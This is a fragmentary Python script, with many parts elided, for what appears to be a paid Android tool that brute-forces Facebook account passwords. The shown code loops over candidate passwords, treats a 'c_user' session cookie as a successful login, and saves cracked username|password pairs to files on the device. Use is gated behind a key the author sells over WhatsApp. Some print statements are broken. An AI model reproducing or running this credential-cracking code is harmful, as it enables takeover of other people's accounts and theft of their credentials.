...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801977073308?text=' + tks)

        

    r1=requests.get("https://github.com/DEVIL-NAJMUL/f/blob/main/Sm.txt").text
    ...
    if key1 in r1:
        ...
        print ("         ༄𝑫𝒆𝒗𝒊𝒍᭄•───────────────────────────────────────•༄𝑵𝒂𝒋𝒎𝒖𝒍᭄")
        print ("             \033[1;94mGIVE ME 100TK FOR APROVAL DEVIL")     
...
logo="""
              \033[1;93m _____  ________      _______ _      
              \033[1;93m|  __ \|  ____\ \    / /_   _| |     
              \033[1;93m| |  | | |__   \ \  / /  | | | |     
              \033[1;93m| |  | |  __|   \ \/ /   | | | |     
              \033[1;93m| |__| | |____   \  /   _| |_| |____ 
             \033[1;93m |_____/|______|   \/   |_____|______|
        \033[1;92m༄𝑫𝒆𝒗𝒊𝒍᭄•───────────────────────────────────────•༄𝑵𝒂𝒋𝒎𝒖𝒍᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : DEVIL           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : N41M01          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mPAGE       :  Devil Najmul       \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +88019 77073308      \033[1;93m▇▇
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGIVE ME 100TK FOR APROVAL      \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄𝑫𝒆𝒗𝒊𝒍᭄•───────────────────────────────────────•༄𝑵𝒂𝒋𝒎𝒖𝒍᭄
""" 
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/DEVIL-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/DEVIL-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : 𝑫𝒆𝒗𝒊𝒍-𝑵𝒂𝒋𝒎𝒖𝒍")
			print ('\033[1;92m༄𝑫𝒆𝒗𝒊𝒍᭄•───────────────────────────────────────•༄𝑵𝒂𝒋𝒎𝒖𝒍᭄')
			key = input(" [*] Choose : ")
			print ('༄𝑫𝒆𝒗𝒊𝒍᭄•───────────────────────────────────────•༄𝑵𝒂𝒋𝒎𝒖𝒍᭄')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[DEVIL]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [DEVIL-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/DEVIL_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/DEVIL_CP.txt' , 'a').write('%s\n' % wrt)
...
def dupcutter():
	...
	os.system("xdg-open https:// /+8801977073308")
